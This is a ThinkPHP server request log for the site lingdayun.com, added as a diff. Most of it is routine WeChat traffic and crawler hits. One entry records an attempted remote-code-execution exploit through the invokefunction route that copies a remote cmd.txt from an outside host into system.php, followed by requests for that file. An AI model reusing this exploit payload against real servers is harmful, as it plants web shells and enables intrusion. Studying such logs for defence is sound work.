@@ -1,0 +1,2593 @@
+[ 2022-12-08T00:15:56+08:00 ] 10.0.8.4 122.193.199.49 GET /index.php/index/api/tankuang
+[ log ] www.lingdayun.com/index.php/index/api/tankuang [运行时间：0.130237s][吞吐率：7.68req/s] [内存消耗：1,916.78kb] [文件加载：52]
+[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'api',
+    2 => 'tankuang',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'cookie' => 'ZDEDebuggerPresent=php,phtml,php3',
+  'accept-language' => 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
+  'accept-encoding' => 'gzip, deflate',
+  'referer' => 'http://www.lingdayun.com/html/shequ_index.html',
+  'x-requested-with' => 'XMLHttpRequest',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 11; M2012K11AC Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.99 XWEB/4365 MMWEBSDK/20220505 Mobile Safari/537.36 MMWEBID/5302 MicroMessenger/8.0.23.2160(0x28001759) WeChat/arm64 Weixin NetType/5G Language/zh_CN ABI/arm64',
+  'accept' => 'application/json, text/javascript, */*; q=0.01',
+  'connection' => 'close',
+  'host' => 'www.lingdayun.com',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Api->tankuang[ C:\wwwroot\www.lingdayun.com\application\index\controller\Api.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000896s ] mysql:dbname=www_lingdayun_co;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `ld_wx_user` [ RunTime:0.003202s ]
+[ sql ] [ SQL ] SELECT * FROM `ld_wx_user` WHERE  `user_openid` = null LIMIT 1 [ RunTime:0.000388s ]
+
+---------------------------------------------------------------
+[ 2022-12-08T00:16:01+08:00 ] 10.0.8.4 122.193.199.49 GET /index.php/index/api/tankuang
+[ log ] www.lingdayun.com/index.php/index/api/tankuang [运行时间：0.124249s][吞吐率：8.05req/s] [内存消耗：1,916.79kb] [文件加载：52]
+[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'api',
+    2 => 'tankuang',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'cookie' => 'ZDEDebuggerPresent=php,phtml,php3',
+  'accept-language' => 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
+  'accept-encoding' => 'gzip, deflate',
+  'referer' => 'http://www.lingdayun.com/html/shequ_index.html',
+  'x-requested-with' => 'XMLHttpRequest',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 11; M2012K11AC Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.99 XWEB/4365 MMWEBSDK/20220505 Mobile Safari/537.36 MMWEBID/5302 MicroMessenger/8.0.23.2160(0x28001759) WeChat/arm64 Weixin NetType/5G Language/zh_CN ABI/arm64',
+  'accept' => 'application/json, text/javascript, */*; q=0.01',
+  'connection' => 'close',
+  'host' => 'www.lingdayun.com',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Api->tankuang[ C:\wwwroot\www.lingdayun.com\application\index\controller\Api.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.010311s ] mysql:dbname=www_lingdayun_co;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `ld_wx_user` [ RunTime:0.002755s ]
+[ sql ] [ SQL ] SELECT * FROM `ld_wx_user` WHERE  `user_openid` = null LIMIT 1 [ RunTime:0.000465s ]
+
+---------------------------------------------------------------
+[ 2022-12-08T00:16:02+08:00 ] 10.0.8.4 122.193.199.49 GET /index.php/index/api/tankuang
+[ log ] www.lingdayun.com/index.php/index/api/tankuang [运行时间：0.115334s][吞吐率：8.67req/s] [内存消耗：1,916.79kb] [文件加载：52]
+[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'api',
+    2 => 'tankuang',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'cookie' => 'ZDEDebuggerPresent=php,phtml,php3',
+  'accept-language' => 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
+  'accept-encoding' => 'gzip, deflate',
+  'referer' => 'http://www.lingdayun.com/html/shequ_index.html',
+  'x-requested-with' => 'XMLHttpRequest',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 11; M2012K11AC Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.99 XWEB/4365 MMWEBSDK/20220505 Mobile Safari/537.36 MMWEBID/5302 MicroMessenger/8.0.23.2160(0x28001759) WeChat/arm64 Weixin NetType/5G Language/zh_CN ABI/arm64',
+  'accept' => 'application/json, text/javascript, */*; q=0.01',
+  'connection' => 'close',
+  'host' => 'www.lingdayun.com',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Api->tankuang[ C:\wwwroot\www.lingdayun.com\application\index\controller\Api.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000694s ] mysql:dbname=www_lingdayun_co;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `ld_wx_user` [ RunTime:0.002525s ]
+[ sql ] [ SQL ] SELECT * FROM `ld_wx_user` WHERE  `user_openid` = null LIMIT 1 [ RunTime:0.000371s ]
+
+---------------------------------------------------------------
+[ 2022-12-08T00:16:03+08:00 ] 10.0.8.4 122.193.199.49 GET /index.php/index/api/tankuang
+[ log ] www.lingdayun.com/index.php/index/api/tankuang [运行时间：0.108409s][吞吐率：9.22req/s] [内存消耗：1,916.79kb] [文件加载：52]
+[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'api',
+    2 => 'tankuang',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'cookie' => 'ZDEDebuggerPresent=php,phtml,php3',
+  'accept-language' => 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
+  'accept-encoding' => 'gzip, deflate',
+  'referer' => 'http://www.lingdayun.com/html/shequ_index.html',
+  'x-requested-with' => 'XMLHttpRequest',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 11; M2012K11AC Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.99 XWEB/4365 MMWEBSDK/20220505 Mobile Safari/537.36 MMWEBID/5302 MicroMessenger/8.0.23.2160(0x28001759) WeChat/arm64 Weixin NetType/5G Language/zh_CN ABI/arm64',
+  'accept' => 'application/json, text/javascript, */*; q=0.01',
+  'connection' => 'close',
+  'host' => 'www.lingdayun.com',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Api->tankuang[ C:\wwwroot\www.lingdayun.com\application\index\controller\Api.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.003977s ] mysql:dbname=www_lingdayun_co;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `ld_wx_user` [ RunTime:0.002743s ]
+[ sql ] [ SQL ] SELECT * FROM `ld_wx_user` WHERE  `user_openid` = null LIMIT 1 [ RunTime:0.000346s ]
+
+---------------------------------------------------------------
+[ 2022-12-08T00:16:03+08:00 ] 10.0.8.4 122.193.199.49 GET /index.php/index/api/tankuang
+[ log ] www.lingdayun.com/index.php/index/api/tankuang [运行时间：0.117504s][吞吐率：8.51req/s] [内存消耗：1,916.79kb] [文件加载：52]
+[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'api',
+    2 => 'tankuang',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'cookie' => 'ZDEDebuggerPresent=php,phtml,php3',
+  'accept-language' => 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
+  'accept-encoding' => 'gzip, deflate',
+  'referer' => 'http://www.lingdayun.com/html/shequ_index.html',
+  'x-requested-with' => 'XMLHttpRequest',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 11; M2012K11AC Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.99 XWEB/4365 MMWEBSDK/20220505 Mobile Safari/537.36 MMWEBID/5302 MicroMessenger/8.0.23.2160(0x28001759) WeChat/arm64 Weixin NetType/5G Language/zh_CN ABI/arm64',
+  'accept' => 'application/json, text/javascript, */*; q=0.01',
+  'connection' => 'close',
+  'host' => 'www.lingdayun.com',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Api->tankuang[ C:\wwwroot\www.lingdayun.com\application\index\controller\Api.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.009464s ] mysql:dbname=www_lingdayun_co;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `ld_wx_user` [ RunTime:0.003589s ]
+[ sql ] [ SQL ] SELECT * FROM `ld_wx_user` WHERE  `user_openid` = null LIMIT 1 [ RunTime:0.000408s ]
+
+---------------------------------------------------------------
+[ 2022-12-08T00:16:04+08:00 ] 10.0.8.4 122.193.199.49 GET /static/js/layer/layer.js
+[ log ] www.lingdayun.com/static/js/layer/layer.js [运行时间：0.064412s][吞吐率：15.53req/s] [内存消耗：1,113.84kb] [文件加载：40]
+[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'static',
+    1 => 'js',
+    2 => 'layer',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'cookie' => 'ZDEDebuggerPresent=php,phtml,php3',
+  'accept-language' => 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
+  'accept-encoding' => 'gzip, deflate',
+  'referer' => 'http://www.lingdayun.com/html/shequ_wode.html',
+  'x-requested-with' => 'com.tencent.mm',
+  'accept' => '*/*',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 11; M2012K11AC Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.99 XWEB/4365 MMWEBSDK/20220505 Mobile Safari/537.36 MMWEBID/5302 MicroMessenger/8.0.23.2160(0x28001759) WeChat/arm64 Weixin NetType/5G Language/zh_CN ABI/arm64',
+  'connection' => 'close',
+  'host' => 'www.lingdayun.com',
+)
+[ info ] [ PARAM ] array (
+  '/static/js/layer/layer_js' => '',
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2022-12-08T00:16:04+08:00 ] 10.0.8.4 122.193.199.49 GET /index.php/api/base/check_login
+[ log ] www.lingdayun.com/index.php/api/base/check_login [运行时间：0.079671s][吞吐率：12.55req/s] [内存消耗：1,335.71kb] [文件加载：45]
+[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'api',
+    1 => 'base',
+    2 => 'check_login',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'cookie' => 'ZDEDebuggerPresent=php,phtml,php3',
+  'accept-language' => 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
+  'accept-encoding' => 'gzip, deflate',
+  'referer' => 'http://www.lingdayun.com/html/shequ_wode.html',
+  'x-requested-with' => 'XMLHttpRequest',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 11; M2012K11AC Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.99 XWEB/4365 MMWEBSDK/20220505 Mobile Safari/537.36 MMWEBID/5302 MicroMessenger/8.0.23.2160(0x28001759) WeChat/arm64 Weixin NetType/5G Language/zh_CN ABI/arm64',
+  'accept' => 'application/json, text/javascript, */*; q=0.01',
+  'connection' => 'close',
+  'host' => 'www.lingdayun.com',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\api\controller\Base->check_login[ C:\wwwroot\www.lingdayun.com\application\api\controller\Base.php ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2022-12-08T00:16:07+08:00 ] 10.0.8.4 122.193.199.49 GET /index.php/index/api/tankuang
+[ log ] www.lingdayun.com/index.php/index/api/tankuang [运行时间：0.115811s][吞吐率：8.63req/s] [内存消耗：1,916.83kb] [文件加载：52]
+[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'api',
+    2 => 'tankuang',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'cookie' => 'ZDEDebuggerPresent=php,phtml,php3; PHPSESSID=i3dq9k3g3oang46tna7kbsf8q4',
+  'accept-language' => 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
+  'accept-encoding' => 'gzip, deflate',
+  'referer' => 'http://www.lingdayun.com/html/shequ_index.html',
+  'x-requested-with' => 'XMLHttpRequest',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 11; M2012K11AC Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.99 XWEB/4365 MMWEBSDK/20220505 Mobile Safari/537.36 MMWEBID/5302 MicroMessenger/8.0.23.2160(0x28001759) WeChat/arm64 Weixin NetType/5G Language/zh_CN ABI/arm64',
+  'accept' => 'application/json, text/javascript, */*; q=0.01',
+  'connection' => 'close',
+  'host' => 'www.lingdayun.com',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Api->tankuang[ C:\wwwroot\www.lingdayun.com\application\index\controller\Api.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.014864s ] mysql:dbname=www_lingdayun_co;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `ld_wx_user` [ RunTime:0.002548s ]
+[ sql ] [ SQL ] SELECT * FROM `ld_wx_user` WHERE  `user_openid` = null LIMIT 1 [ RunTime:0.000327s ]
+
+---------------------------------------------------------------
+[ 2022-12-08T00:16:25+08:00 ] 10.0.8.4 122.193.199.49 GET /index.php/api/base/check_login
+[ log ] www.lingdayun.com/index.php/api/base/check_login [运行时间：0.081048s][吞吐率：12.34req/s] [内存消耗：1,335.59kb] [文件加载：45]
+[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'api',
+    1 => 'base',
+    2 => 'check_login',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'cookie' => 'ZDEDebuggerPresent=php,phtml,php3; PHPSESSID=i3dq9k3g3oang46tna7kbsf8q4',
+  'accept-language' => 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
+  'accept-encoding' => 'gzip, deflate',
+  'referer' => 'http://www.lingdayun.com/html/shequ_wode.html',
+  'x-requested-with' => 'XMLHttpRequest',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 11; M2012K11AC Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.99 XWEB/4365 MMWEBSDK/20220505 Mobile Safari/537.36 MMWEBID/5302 MicroMessenger/8.0.23.2160(0x28001759) WeChat/arm64 Weixin NetType/5G Language/zh_CN ABI/arm64',
+  'accept' => 'application/json, text/javascript, */*; q=0.01',
+  'connection' => 'close',
+  'host' => 'www.lingdayun.com',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\api\controller\Base->check_login[ C:\wwwroot\www.lingdayun.com\application\api\controller\Base.php ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2022-12-08T01:06:16+08:00 ] 10.0.8.4 43.248.96.186 GET /?s=/admin/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=copy&vars%5B1%5D%5B%5D=http://tongyong888.xyz/cmd.txt&vars%5B1%5D%5B%5D=system.php
+[ log ] lingdayun.com/?s=/admin/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=copy&vars%5B1%5D%5B%5D=http://tongyong888.xyz/cmd.txt&vars%5B1%5D%5B%5D=system.php [运行时间：0.074538s][吞吐率：13.42req/s] [内存消耗：1,113.38kb] [文件加载：40]
+[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => '\\think\\app',
+    2 => 'invokefunction',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'close',
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'user-agent' => 'python-requests/2.27.1',
+  'host' => 'lingdayun.com',
+)
+[ info ] [ PARAM ] array (
+  'function' => 'call_user_func_array',
+  'vars' => 
+  array (
+    0 => 'copy',
+    1 => 
+    array (
+      0 => 'http://tongyong888.xyz/cmd.txt',
+      1 => 'system.php',
+    ),
+  ),
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2022-12-08T01:06:16+08:00 ] 10.0.8.4 43.248.96.186 GET /system.php
+[ log ] lingdayun.com/system.php [运行时间：0.070039s][吞吐率：14.28req/s] [内存消耗：1,112.14kb] [文件加载：40]
+[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'system.php',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'close',
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'user-agent' => 'python-requests/2.27.1',
+  'host' => 'lingdayun.com',
+)
+[ info ] [ PARAM ] array (
+  '/system_php' => '',
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2022-12-08T01:10:05+08:00 ] 10.0.8.4 220.196.160.73 GET /system.php
+[ log ] lingdayun.com/system.php [运行时间：0.066853s][吞吐率：14.96req/s] [内存消耗：1,113.01kb] [文件加载：40]
+[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'system.php',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'upgrade-insecure-requests' => '1',
+  'connection' => 'close',
+  'cache-control' => 'max-age=0',
+  'accept-language' => 'zh-CN,zh;q=0.9',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+  'user-agent' => 'python-requests/2.27.1',
+  'host' => 'lingdayun.com',
+)
+[ info ] [ PARAM ] array (
+  '/system_php' => '',
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2022-12-08T01:14:24+08:00 ] 10.0.8.4 110.249.201.112 GET /
+[ log ] lingdayun.com/ [运行时间：0.079592s][吞吐率：12.56req/s] [内存消耗：1,276.52kb] [文件加载：44]
+[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'close',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+  'accept-language' => 'zh,zh-CN;q=0.9',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 5.0) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; Bytespider; https://zhanzhang.toutiao.com/)',
+  'upgrade-insecure-requests' => '1',
+  'host' => 'lingdayun.com',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ C:\wwwroot\www.lingdayun.com\application\index\controller\Index.php ]
+[ info ] [ VIEW ] C:\wwwroot\www.lingdayun.com\public/../application/index\view\index\index.html [ array (
+) ]
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2022-12-08T01:18:22+08:00 ] 10.0.8.4 111.225.149.101 GET /index.html
+[ log ] lingdayun.com/index.html [运行时间：0.081213s][吞吐率：12.31req/s] [内存消耗：1,279.63kb] [文件加载：44]
+[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'close',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+  'accept-language' => 'zh,zh-CN;q=0.9',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 5.0) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; Bytespider; https://zhanzhang.toutiao.com/)',
+  'upgrade-insecure-requests' => '1',
+  'host' => 'lingdayun.com',
+)
+[ info ] [ PARAM ] array (
+  '/index_html' => '',
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ C:\wwwroot\www.lingdayun.com\application\index\controller\Index.php ]
+[ info ] [ VIEW ] C:\wwwroot\www.lingdayun.com\public/../application/index\view\index\index.html [ array (
+) ]
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2022-12-08T01:24:04+08:00 ] 10.0.8.4 220.196.160.144 GET /index.html
+[ log ] lingdayun.com/index.html [运行时间：0.078270s][吞吐率：12.78req/s] [内存消耗：1,279.95kb] [文件加载：44]
+[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'upgrade-insecure-requests' => '1',
+  'connection' => 'close',
+  'cache-control' => 'max-age=0',
+  'accept-language' => 'zh-CN,zh;q=0.9',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 5.0) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; Bytespider; https://zhanzhang.toutiao.com/)',
+  'host' => 'lingdayun.com',
+)
+[ info ] [ PARAM ] array (
+  '/index_html' => '',
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ C:\wwwroot\www.lingdayun.com\application\index\controller\Index.php ]
+[ info ] [ VIEW ] C:\wwwroot\www.lingdayun.com\public/../application/index\view\index\index.html [ array (
+) ]
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2022-12-08T03:12:36+08:00 ] 10.0.8.4 40.77.167.15 GET /
+[ log ] www.lingdayun.com/ [运行时间：0.078410s][吞吐率：12.75req/s] [内存消耗：1,276.48kb] [文件加载：44]
+[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36',
+  'host' => 'www.lingdayun.com',
+  'from' => 'bingbot(at)microsoft.com',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => '*/*',
+  'pragma' => 'no-cache',
+  'connection' => 'close',
+  'cache-control' => 'no-cache',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ C:\wwwroot\www.lingdayun.com\application\index\controller\Index.php ]
+[ info ] [ VIEW ] C:\wwwroot\www.lingdayun.com\public/../application/index\view\index\index.html [ array (
+) ]
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2022-12-08T04:19:24+08:00 ] 10.0.8.4 106.52.109.61 GET /
+[ log ] lingdayun.com/ [运行时间：0.078321s][吞吐率：12.77req/s] [内存消耗：1,276.02kb] [文件加载：44]
+[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'close',
+  'accept-encoding' => 'gzip',
+  'user-agent' => 'mozilla/5.0 (iphone; cpu iphone os 13_5_1 like mac os x) applewebkit/605.1.15 (khtml, like gecko) mobile/15e148 micromessenger/7.0.15(0x17000f2b) nettype/4g language/zh_cn miniprogram',
+  'host' => 'lingdayun.com',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ C:\wwwroot\www.lingdayun.com\application\index\controller\Index.php ]
+[ info ] [ VIEW ] C:\wwwroot\www.lingdayun.com\public/../application/index\view\index\index.html [ array (
+) ]
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2022-12-08T04:20:08+08:00 ] 10.0.8.4 42.193.132.4 GET /
+[ log ] www.lingdayun.com/ [运行时间：0.093756s][吞吐率：10.67req/s] [内存消耗：1,276.04kb] [文件加载：44]
+[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'close',
+  'accept-encoding' => 'gzip',
+  'user-agent' => 'mozilla/5.0 (iphone; cpu iphone os 13_5_1 like mac os x) applewebkit/605.1.15 (khtml, like gecko) mobile/15e148 micromessenger/7.0.15(0x17000f2b) nettype/4g language/zh_cn miniprogram',
+  'host' => 'www.lingdayun.com',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ C:\wwwroot\www.lingdayun.com\application\index\controller\Index.php ]
+[ info ] [ VIEW ] C:\wwwroot\www.lingdayun.com\public/../application/index\view\index\index.html [ array (
+) ]
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2022-12-08T05:18:57+08:00 ] 10.0.8.4 124.71.166.204 GET /
+[ log ] www.lingdayun.com/ [运行时间：0.080069s][吞吐率：12.49req/s] [内存消耗：1,276.59kb] [文件加载：44]
+[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'close',
+  'accept-encoding' => 'gzip',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 7.5; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.1246.88 Safari/537.36',
+  'accept-language' => 'zh-CN, zh; q=0.9, en; q=0.8, ko; q=0.7',
+  'accept' => 'text/html, application/xhtml+xml, application/xml; q=0.9, image/webp; q=0.8',
+  'host' => 'www.lingdayun.com',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ C:\wwwroot\www.lingdayun.com\application\index\controller\Index.php ]
